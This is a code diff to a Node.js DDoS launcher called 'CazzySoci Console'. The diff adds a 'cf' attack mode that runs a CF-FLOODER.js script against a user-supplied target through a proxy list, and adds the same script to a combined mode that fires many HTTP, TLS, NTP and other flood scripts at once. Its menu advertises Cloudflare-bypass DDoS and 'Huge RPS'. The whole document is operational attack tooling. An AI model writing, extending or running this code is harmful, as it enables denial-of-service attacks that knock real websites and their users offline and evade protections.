@@ -370,6 +370,10 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
 	  } else if (methods === 'lol') {
        pushOngoing(target, methods, duration)
 	exec(`node ${metode} ${target} ${duration} 30 100 proxy.txt --proxy`)
+          sigma()
+	  } else if (methods === 'cf') {
+       pushOngoing(target, methods, duration)
+	exec(`node ${metode} POST ${target} proxy.txt ${duration} 30 100`)       
 	  
 const flood = path.join(__dirname, `/lib/cache/flood.js`);
 const tls = path.join(__dirname, `/lib/cache/tls.js`);
@@ -387,6 +391,7 @@ const ntp = path.join(__dirname, `NTP`);
 const mem = path.join(__dirname, `MEM`);
 const kupal = path.join(__dirname, `/lib/cache/jennessee.js`);
 const lol = path.join(__dirname, `/lib/cache/xyecoc.js`);
+const cf = path.join(__dirname, `/lib/cache/CF-FLOODER.js`);
         exec(`node ${flood} ${target} ${duration}`)
         exec(`node ${tls} ${target} ${duration} 100 100`)
         exec(`node ${strike} GET ${target} ${duration} 100 100 proxy.txt`)
@@ -403,6 +408,7 @@ const lol = path.join(__dirname, `/lib/cache/xyecoc.js`);
         exec(`node ${mem} ${target} 80 ${duration}`)
 	exec(`node ${kupal} ${target} ${duration} 100 30 proxy.txt --full`)
 	exec(`node ${lol} ${target} ${duration} 30 100 proxy.txt --proxy`)
+	exec(`node ${cf} POST ${target} proxy.txt ${duration} 30 100`)
 	
 	
 	  
@@ -704,6 +710,7 @@ permen.question('[\x1b[1m\x1b[32mCazzySoci Console\x1b[0m]: \n', (input) => {
 || flood      || HTTP(s) Flood DoS
 || tls        || TLS 1.3 
 || strike     || Best DDoS methods
+|| cf         || CLOUDFARE FLOODER 
 || kill       || Bypass Cf DDoS methods
 || raw        || Huge RPS Flexing XD
 || bypass     || Bypass With High Power
